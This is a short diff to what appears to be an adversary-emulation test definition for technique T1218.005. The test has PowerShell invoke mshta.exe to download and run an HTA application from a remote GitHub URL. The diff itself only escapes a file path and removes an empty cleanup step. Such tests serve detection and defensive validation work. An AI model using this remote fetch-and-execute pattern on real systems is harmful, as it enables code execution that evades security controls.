@@ -4,7 +4,7 @@ description: Executes an HTA Application by directly downloading from remote URI
 args:
     - name: mshta_file_path
       type: string
-      default: $env:windir\system32\mshta.exe
+      default: $env:windir\\system32\\mshta.exe
     - name: hta_uri
       type: url
       default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta
@@ -23,6 +23,3 @@ steps:
     - name: invoke-html-application---direct-download-from-uri
       inline: Invoke-ATHHTMLApplication -HTAUri {{.Args.hta_uri}} -MSHTAFilePath {{.Args.mshta_file_path}}
       executor: powershell
-      cleanup:
-        inline: ""
-        executor: powershell
